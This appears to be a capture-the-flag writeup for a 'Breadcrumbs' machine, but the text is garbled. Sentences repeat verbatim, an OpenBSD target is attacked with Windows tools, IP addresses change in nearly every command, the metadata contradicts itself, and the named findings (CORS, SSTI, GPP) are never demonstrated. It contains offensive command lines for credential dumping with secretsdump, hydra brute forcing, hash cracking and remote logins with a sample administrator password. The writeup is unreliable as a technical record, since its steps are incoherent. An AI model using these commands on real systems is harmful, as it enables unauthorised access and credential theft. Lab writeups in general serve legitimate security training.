---
TitleSEO: "PwnTillDawn — Breadcrumbs (Hard OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Breadcrumbs (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Breadcrumbs. CORS Misconfiguration and GPP Password to achieve hard compromise on OpenBSD."
Keywords: "easy, forensics, tryhackme, ctf, insane"
URL: "https://zurefx.github.io/writeups/htb-breadcrumbs-685.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-breadcrumbs-685/"
Date: "2025-04-08"
Tags: "Easy, Forensics, TryHackMe, CTF, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-breadcrumbs-685"
Permalink: "/writeups/htb-breadcrumbs-685.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Breadcrumbs** is rated **Hard** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.67.240.14`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.58.98.181/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.2.224
crackmapexec smb 10.61.32.33 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.76.105.141 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.107.82.235 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.91.123
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

Key finding: **GPP Password**.

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.186.91
feroxbuster -h
crackmapexec smb 10.24.34.241 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
evil-winrm -i 10.109.6.187 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.223.179 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```powershell
crackmapexec smb 10.21.70.128 -u administrator -p 'P@ssw0rd!' --shares
```

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `smbclient`
- `impacket`
- `ffuf`
- `wpscan`
- `crackmapexec`

### Key Takeaways

- CORS Misconfiguration
- GPP Password
